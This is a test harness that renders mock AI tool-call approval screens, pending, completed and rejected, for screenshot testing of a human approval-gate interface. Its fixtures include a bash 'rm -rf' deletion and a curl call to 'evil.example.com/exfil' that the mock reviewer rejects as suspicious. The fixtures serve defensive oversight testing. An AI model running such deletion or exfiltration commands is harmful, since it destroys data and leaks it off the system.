// Visual regression test harness for approval-gate frontend
// Mounts the full UI with mock data to capture whole-page screenshots

import { mount } from "svelte";
import ActionList from "../../ActionList.svelte";
import ActionDetail from "../../ActionDetail.svelte";
import HarnessIndex from "./HarnessIndex.svelte";
import type { Action } from "../../types.ts";

const PENDING_BASH: Action = {
  key: { session_key: "session-abc-123", action_seq: 1 },
  created_at: "2025-01-15T10:30:00Z",
  updated_at: "2025-01-15T10:30:00Z",
  call: { server_namespace: "runtime", tool_name: "bash", arguments: { argv: ["rm", "-rf", "/tmp/test"] } },
  justification: "Clean up test directory after running integration tests",
  state: { status: "pending" },
};

const PENDING_PYTHON: Action = {
  key: { session_key: "session-def-456", action_seq: 1 },
  created_at: "2025-01-15T10:35:00Z",
  updated_at: "2025-01-15T10:35:00Z",
  call: { server_namespace: "runtime", tool_name: "python_exec", arguments: { code: 'print("hello world")' } },
  justification: "Debug output for tracing pipeline state",
  state: { status: "pending" },
};

const DONE_SUCCEEDED: Action = {
  key: { session_key: "session-ghi-789", action_seq: 1 },
  created_at: "2025-01-15T09:00:00Z",
  updated_at: "2025-01-15T09:01:30Z",
  call: { server_namespace: "runtime", tool_name: "bash", arguments: { argv: ["ls", "-la", "/home"] } },
  justification: "List home directory contents for debugging",
  state: {
    status: "done",
    outcome: {
      content: [
        {
          type: "text",
          text: "total 8\ndrwxr-xr-x 3 user user 4096 Jan 15 09:00 .\ndrwxr-xr-x 20 root root 4096 Jan 15 08:00 ..",
        },
      ],
      isError: false,
    },
  },
};

const REJECTED: Action = {
  key: { session_key: "session-jkl-012", action_seq: 1 },
  created_at: "2025-01-15T08:00:00Z",
  updated_at: "2025-01-15T08:05:00Z",
  call: {
    server_namespace: "runtime",
    tool_name: "bash",
    arguments: { argv: ["curl", "-s", "http://evil.example.com/exfil"] },
  },
  justification: "Fetch external resource for processing",
  state: { status: "rejected", reason: "Suspicious external network request" },
};

const pages: Record<string, { component: unknown; props: Record<string, unknown> }> = {
  // ListPage: full list view showing pending and recently-resolved actions
  ListPage: {
    component: ActionList,
    props: {
      pending: [PENDING_BASH, PENDING_PYTHON],
      recent: [DONE_SUCCEEDED, REJECTED],
    },
  },
  // DetailPage: action detail for a pending action showing approve/reject workflow
  DetailPage: {
    component: ActionDetail,
    props: { action: PENDING_BASH },
  },
};

const params = new URLSearchParams(window.location.search);
const pageName = params.get("page");
const app = document.getElementById("app")!;
const page = pageName ? pages[pageName] : null;

if (page) {
  mount(page.component as Parameters<typeof mount>[0], { target: app, props: page.props });
} else {
  // Index page — list available scenarios
  mount(HarnessIndex, { target: app, props: { pages: Object.keys(pages), error: pageName } });
}
